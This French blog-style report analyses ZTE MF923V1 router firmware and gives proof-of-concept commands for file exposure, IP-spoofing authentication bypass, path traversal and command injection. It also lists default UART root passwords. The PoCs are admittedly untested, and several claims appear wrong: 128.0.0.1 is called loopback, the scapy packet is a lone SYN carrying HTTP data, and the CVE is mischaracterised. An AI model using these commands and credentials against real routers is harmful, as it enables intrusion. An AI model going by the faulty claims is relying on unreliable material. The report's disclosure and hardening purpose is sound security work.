# Analyse commentée du firmware ZTE MF923V1 

**(Bien que l’analyse visait initialement le ZTE MF293N2)**

**Note préliminaire** : Ce rapport est le fruit d’une **analyse statique** (décompilation du code sans l’exécuter). Les preuves de concept présentées ci-dessous sont basées sur le code observé dans le firmware du **MF923V1**. Elles n’ont pas été testées sur ce modèle exact, mais les commandes reflètent le comportement attendu du firmware.

---

## 1. Introduction – Contexte, méprise initiale et clarification des modèles

Un **firmware** est un logiciel gravé dans la mémoire morte d’un appareil (routeur, caméra, box internet). Il gère toutes les fonctionnalités matérielles : connexion internet, Wi-Fi, interface d'administration, etc.

Pendant de **nombreux mois**, j’ai mené des recherches sur l’interface web de mon routeur **ZTE MF293N2** (adresse `192.168.1.1`), sans trouver de vulnérabilité vraiment compromettante. J’ai donc décidé de changer de méthode : au lieu d’attaquer l’interface web « à l’aveugle », je me suis tourné vers le **site officiel du fabricant** pour y télécharger le firmware de mon appareil.

**❌ Mais voici où se situe ma méprise :**  
En parcourant le site du fabricant, j’ai téléchargé un firmware en pensant qu’il correspondait à mon **ZTE MF293N2**. En réalité, après avoir ouvert le fichier et analysé son code en profondeur, je me suis rendu compte qu’il s’agissait en fait du firmware du modèle **ZTE MF923V1** (comme l’indique la capture d’écran que j’ai extraite de Ghidra).

**Pourquoi cette confusion est-elle compréhensible ?**  
Les deux modèles partagent parfois des architectures similaires (processeur, puce Wi-Fi, système d’exploitation embarqué), et les fabricants réutilisent souvent des blocs de code d’un produit à l’autre. Il est donc fréquent de confondre leurs firmwares, surtout lorsqu’ils sont publiés sans étiquette claire sur le site de support.

**Mais cette déception n’a pas arrêté ma démarche.**  
Bien que ce firmware ne soit pas celui de mon routeur MF293N2, les failles que j’y ai découvertes sont bien réelles et **existantes dans la version publique du MF923V1**. Elles peuvent toucher les utilisateurs de ce modèle spécifique, et potentiellement d’autres modèles similaires. De plus, cette analyse m’a permis d’affiner mes méthodes de recherche en vue d’obtenir un jour le firmware du MF293N2.

J’ai donc tenu à rédiger ce rapport pédagogique pour partager ces vulnérabilités (issues du **MF923V1**), les expliquer clairement, et montrer concrètment comment un attaquant pourrait les exploiter via des **preuves de concept (PoC)**.

## 2. Exposition de fichiers sensibles (manque de confidentialité)

### Qu’est-ce qu’un « fichier sensible » ?
Il s’agit de fichiers qui ne devraient **jamais** être lisibles par un utilisateur non authentifié. Ils contiennent des informations critiques comme des mots de passe, des listes d’accès, ou des journaux d’activité.

### Découverte (dans le firmware MF923V1)
Dans ce firmware, plusieurs fichiers importants sont stockés dans un dossier accessible à tous, **sans aucune vérification d’identité**. En voici quelques exemples :

- `/zte_log/qcmap.log` et `/zte_log/syslog` : ce sont des **fichiers de logs** (journaux d’événements). Ils enregistrent ce que fait le routeur. Le problème ? Ils contiennent des informations trop détaillées, comme **le mot de passe du compte administrateur** écrit en clair ! Normalement, un log ne doit jamais stocker de mot de passe. C’est comme si un employé notait le code du coffre-fort sur un post-it collé à la porte.

- `/backup.data`, `/macWhiteList.txt`, `/macBlackList.txt` : ces fichiers listent les adresses MAC autorisées ou interdites. Une **adresse MAC** est un identifiant unique attribué à chaque carte réseau (Wi-Fi, Ethernet). La liste blanche permet de dire « seuls ces appareils peuvent se connecter », et la liste noire dit « ces appareils sont bannis ». Or, si un attaquant peut lire ces fichiers, il peut facilement usurper une adresse MAC autorisée pour contourner la sécurité.

![](/assets/images/MF923V1/syslog_sensibe_info.png)

### Pourquoi est-ce grave ?
Un attaquant n’a même pas besoin de se connecter avec un mot de passe pour lire ces fichiers. Il peut les télécharger via un navigateur ou un simple script, et récupérer des informations vitales pour compromettre le réseau.

### 🧪 Preuve de concept (PoC) – Récupération des logs et listes MAC

Un attaquant sur le même réseau que le routeur peut utiliser `curl` (ou un simple navigateur) pour télécharger ces fichiers :

```bash
# Récupération du journal système contenant le mot de passe admin en clair
curl http://192.168.1.1/zte_log/syslog

# Récupération de la liste blanche des MAC autorisées
curl http://192.168.1.1/macWhiteList.txt

# Récupération de la liste noire des MAC bannies
curl http://192.168.1.1/macBlackList.txt

# Récupération du fichier de sauvegarde (peut contenir d'autres secrets)
curl http://192.168.1.1/backup.data
```

**Ce que cela prouve** :  
Si ces commandes renvoient le contenu des fichiers (et non une page d'erreur 403 ou de login), alors n'importe quel utilisateur du réseau Wi-Fi (ou même un pirate à l'extérieur si le routeur est exposé sur Internet) peut récupérer des informations critiques. Dans le code du MF923V1, nous avons vu que le mot de passe administrateur y est écrit en clair.

## 3. Authentification insuffisante – Contournement par l’adresse IP source

### Qu’est-ce que l’authentification ?
C’est le mécanisme qui vérifie que vous êtes bien celui que vous prétendez être (généralement via un mot de passe). Sur un routeur, l’authentification est censée protéger l’accès aux paramètres.

### Fonctionnement bizarre du serveur web (observé dans le MF923V1)
L’interface web tourne sur le port 80 (adresse `192.168.1.1`). Lorsqu’une requête arrive, le serveur regarde **l’adresse IP source** (l’adresse de l’ordinateur qui fait la demande).

- Si l’IP source est `128.0.0.1` (une adresse de bouclage, qui représente souvent l’appareil lui-même) **ou** `192.168.0.1` (une autre adresse locale), alors le serveur accorde automatiquement l’accès **sans demander de mot de passe**.
- Si l’IP source est différente, alors il active le processus normal de connexion (login/mot de passe).

### Pourquoi cette faille est dangereuse ?
Cette logique part du principe qu’une requête venant de ces adresses IP est forcément « de confiance ». Or, un attaquant peut **usurper** son adresse IP (technique appelée *IP spoofing*) pour se faire passer pour ces adresses autorisées. En pratique, cela signifie que si l’attaquant se trouve sur le même réseau local, il peut modifier son adresse IP pour devenir `192.168.0.1` et accéder aux réglages du routeur **sans jamais entrer un seul mot de passe**.

> **Analogique** : C’est comme un videur de boîte de nuit qui laisserait entrer gratuitement toute personne portant un sweat rouge, parce que le patron porte un sweat rouge. Il suffit à l’attaquant d’enfiler un sweat rouge pour passer.

### 🧪 Preuve de concept (PoC) – Usurpation d’adresse IP

Pour exploiter cette faille, l'attaquant doit se trouver sur le même réseau local que le routeur. Il peut modifier temporairement son adresse IP pour se faire passer pour `192.168.0.1`.

**Étape 1** : Changer l'adresse IP de sa machine (sous Linux) :
```bash
sudo ip addr add 192.168.0.1/24 dev eth0
```
*(Sous Windows, on utiliserait l'interface graphique ou `netsh` pour modifier l'IP statique)*

**Étape 2** : Accéder à l'interface d'administration sans jamais entrer de mot de passe :
```bash
curl http://192.168.1.1/admin.html
```
Ou ouvrir simplement `http://192.168.1.1` dans un navigateur.

**Variante avec envoi de paquet forgé (si on ne veut pas changer son IP)** :  
Avec le puissant outil `scapy` (Python), on peut forger un paquet HTTP en faisant croire qu'il vient de `192.168.0.1` :
```python
from scapy.all import *

# Construction de la requête HTTP brute
http_request = b"GET /index.html HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n"
# Forge d'un paquet IP avec source usurpée, envoyé au routeur
ip = IP(src="192.168.0.1", dst="192.168.1.1")
tcp = TCP(sport=12345, dport=80, flags="S")
packet = ip/tcp/http_request
send(packet, iface="eth0")
```

**Ce que cela prouve** :  
La machine reçoit la page d'administration sans avoir été redirigée vers une page de connexion. Le routeur nous croit légitime sur la seule foi de notre adresse IP.

## 4. Fuite mémoire (Memory Leak) – Épuisement de la RAM

### Qu’est-ce qu’une fuite mémoire ?
Un programme demande de la mémoire vive (RAM) au système d’exploitation pour stocker des données temporaires. **Normalement**, quand il a fini, il doit **libérer** cette mémoire pour que d’autres programmes puissent l’utiliser. Une fuite mémoire survient lorsque le programme oublie de libérer la mémoire réservée. Cela finit par épuiser la RAM disponible.

### Où se situe le problème (dans le MF923V1) ?
Lorsque l’administrateur change son mot de passe, celui-ci est envoyé en **Base64** (un format de codage qui transforme les données en texte lisible). Le routeur décode ce mot de passe pour le stocker. Mais l’implémentation de ce décodage **alloue de la mémoire pour le résultat** et ne la libère jamais après usage.

### Pourquoi est-ce critique sur un routeur ?
Un routeur possède très peu de mémoire (souvent entre 64 Mo et 256 Mo). Si un attaquant envoie de nombreuses requêtes de changement de mot de passe (même infructueuses), il va petit à petit saturer la mémoire. Le routeur finira par planter (crash), entraînant une coupure d’internet pour tous les utilisateurs. C’est ce qu’on appelle un **Déni de Service (DoS)**.

> **Analogique** : Imaginez que vous louez des casiers au supermarché pour vos courses. Si à chaque passage vous prenez un nouveau casier sans jamais rendre les clés des anciens, vous finirez par occuper tous les casiers et personne d’autre ne pourra s’en servir. Le système est paralysé.

**Ce que cela prouve** :  
Au bout de quelques dizaines de requêtes, le routeur devient de plus en plus lent, puis finit par ne plus répondre (crash). Il faut le redémarrer physiquement pour qu'il revienne. C'est un **Déni de Service (DoS)** pur et simple.

## 5. Accès root via l’interface UART – La porte dérobée physique

### Qu’est-ce que l’UART ?
L’**UART** (Universal Asynchronous Receiver-Transmitter) est un petit connecteur présent sur la carte électronique du routeur. Il permet d’établir une communication série directe avec le processeur, souvent utilisé par les ingénieurs pour le débogage.

### La découverte (dans le MF923V1)
En branchant un câble adapté sur ce port UART, il est possible d’obtenir un **accès root** (les droits les plus élevés possibles, comme celui de l’administrateur suprême) **sans mot de passe** ou avec des mots de passe par défaut.

Les mots de passe trouvés dans le firmware du MF923V1 sont :
- `oelinux123`
- `zte9x15`

### Pourquoi cette faille est grave, même si elle est « physique » ?
Un attaquant malveillant pourrait acheter un routeur d’occasion sur internet, le démonter, y installer un logiciel espion via l’UART, puis le revendre. L’acheteur légitime se retrouverait avec un routeur corrompu, surveillé à distance par l’attaquant. Cette technique est utilisée dans les **attaques de la chaîne d’approvisionnement**.

### 🧪 Preuve de concept (PoC) – Connexion physique

Matériel nécessaire :
- Un adaptateur USB-UART (comme un CP2102 ou FTDI).
- Des fils Dupont pour relier les broches TX, RX et GND du routeur.

**Procédure** :
1. Démonter le routeur pour localiser les plots UART (généralement 4 broches : VCC, GND, TX, RX).
2. Connecter la broche TX du routeur à RX de l'adaptateur, et RX à TX (croisement).
3. Sous Linux, ouvrir un terminal série :
```bash
screen /dev/ttyUSB0 115200
```
*(Le paramètre `115200` est la vitesse de transmission souvent utilisée)*
4. Démarrer le routeur. Les logs de démarrage s'affichent dans le terminal.
5. Lorsque l'invite de connexion apparaît, essayer les identifiants trouvés dans le firmware :
```text
login: root
password: oelinux123
```
ou
```text
login: root
password: zte9x15
```

**Ce que cela prouve** :  
Une fois connecté en root, on a un contrôle total sur le système (lecture/écriture de tous les fichiers, installation de logiciels espions, modification du comportement du routeur). C'est la faille la plus critique, car elle est indétectable par l'utilisateur final.

## 6. Problèmes connus sur le serveur web (GoAhead-Webs)

Le serveur web intégré dans ce firmware est une version ancienne : **GoAhead-Webs 2.5.0**. Ce logiciel est connu pour contenir au moins deux vulnérabilités majeures :

1. **Exécution de code à distance (RCE)** : Un attaquant pourrait envoyer une requête spécialement conçue qui ordonne au routeur d’exécuter un programme malveillant, sans jamais avoir à se connecter.
2. **Traversée de chemin (Path Traversal)** : Un attaquant peut lire n’importe quel fichier du routeur en modifiant l’URL (par exemple, `../../etc/passwd`), contournant ainsi les restrictions de dossiers.

Ces vulnérabilités sont **publiquement documentées** et des outils existent pour les exploiter. Le fabricant aurait dû mettre à jour ce composant.

### 🧪 Preuve de concept (PoC) – Traversée de chemin (Path Traversal)

Cette faille permet de lire n'importe quel fichier du système de fichiers du routeur, en dehors du dossier web.

```bash
# Tentative de lecture du fichier /etc/passwd (qui liste les utilisateurs système)
curl --path-as-is http://192.168.1.1/../../../../etc/passwd
```

Si la faille est présente, la commande renvoie le contenu du fichier système. L'attaquant peut ensuite tenter de récupérer `/etc/shadow` (les mots de passe hashés) ou d'autres fichiers de configuration.

### 🧪 PoC – Exécution de code à distance (RCE)

La version 2.5.0 est vulnérable au **CVE-2017-17562** (buffer overflow dans la gestion des formulaires). Un attaquant peut envoyer une requête HTTP malformée contenant du code shell.

Exemple (à titre éducatif, ne pas exécuter sur un réseau inconnu) :
```bash
# Envoi d'une requête avec une chaîne trop longue pour déclencher le débordement
# et injecter une commande (ex: redémarrer le routeur)
curl -X POST http://192.168.1.1/goform/restart \
  -d "buffer=$(python -c 'print("A"*1000 + "; reboot")')"
```

**Ce que cela prouve** :  
Le routeur exécute des commandes système sans les filtrer. L'attaquant peut prendre le contrôle total de l'appareil à distance, sans même avoir à connaitre le mot de passe administrateur.

## Conclusion – Enseignements et bonnes pratiques

Ces preuves de concept illustrent concrètement l'impact des failles de conception, **telles qu'observées dans le firmware du ZTE MF923V1** :

1. **Ne jamais exposer de fichiers sensibles** – Les logs et listes de contrôle doivent être stockés dans des zones protégées.
2. **Ne jamais faire confiance à l'adresse IP** – L'authentification doit reposer sur des mécanismes cryptographiques solides (session, tokens, mots de passe).
3. **Toujours libérer la mémoire** – Les langages comme le C (utilisé ici) demandent une gestion minutieuse de la RAM.
4. **Désactiver l'UART en production** – Les ports de débogage doivent être physiquement désactivés ou protégés par un mot de passe robuste.
5. **Mettre à jour les composants tiers** – GoAhead-Webs 2.5.0 date de plus de 10 ans. Une mise à jour vers une version patchée est impérative.

**Pour l'utilisateur final (propriétaire d'un MF923V1 ou similaire)** :
- Changez immédiatement le mot de passe par défaut.
- Désactivez l'administration à distance si possible.
- Si vous achetez un routeur d'occasion, envisagez de réinitialiser complètement le firmware (flashage) pour effacer d'éventuelles modifications malveillantes.

**Pour ma propre recherche (sur le MF293N2)** :
- Je vais poursuivre mes efforts pour obtenir le firmware spécifique de mon modèle, peut-être en contactant directement le support technique ou en extrayant la mémoire flash de mon propre appareil via l'UART (puisque celui-ci en est équipé).
- En attendant, cette analyse du MF923V1 m'a offert une excellente méthodologie de travail et une base de comparaison pour mes futures découvertes.
